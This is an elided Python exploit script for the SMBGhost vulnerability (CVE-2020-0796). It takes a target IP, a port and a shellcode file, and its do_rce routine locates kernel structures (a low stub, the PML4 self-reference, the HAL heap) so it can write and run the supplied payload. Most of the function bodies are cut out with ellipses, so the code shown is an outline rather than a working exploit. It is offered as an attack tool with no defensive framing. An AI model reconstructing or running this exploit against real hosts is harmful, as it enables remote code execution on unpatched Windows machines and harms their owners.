#!/usr/bin/env python3
'''EXPLOITING SMBGHOST CVE-2020-0796 VULN'''
...
def build_shellcode(filepath_shellcode):
    ...
    file_user_payload = open(filepath_shellcode, "r", encoding="utf-8").read()
    USER_PAYLOAD = file_user_payload
...
def do_rce(ip, port, filepath_shellcode):
    find_low_stub(ip, port)
    find_pml4_selfref(ip, port)
    search_hal_heap(ip, port)

    build_shellcode(filepath_shellcode)
    ...
    print(f"[+] Wrote shellcode at {pshellcodeva}!")
...
if __name__ == "__main__":
    ...
    parser.add_argument("-f", "--filepath", help="Path to the payload file", required=True)
    args = parser.parse_args()

    do_rce(args.ip, args.port, args.filepath)
